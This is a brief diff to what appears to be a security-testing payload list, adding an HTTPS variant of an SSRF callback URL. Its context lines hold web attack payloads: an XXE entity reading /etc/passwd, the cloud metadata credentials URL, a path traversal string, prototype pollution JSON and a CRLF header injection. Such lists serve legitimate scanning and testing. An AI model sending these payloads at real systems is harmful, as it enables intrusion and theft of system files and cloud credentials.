@@ -2,6 +2,7 @@
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://{domain}/ssrf
+https://{domain}/ssrf
 ../../../../../../../etc/passwd
 {"__proto__":{"polluted":1337}}
 %0d%0aX-Injected:1337%0d%0a
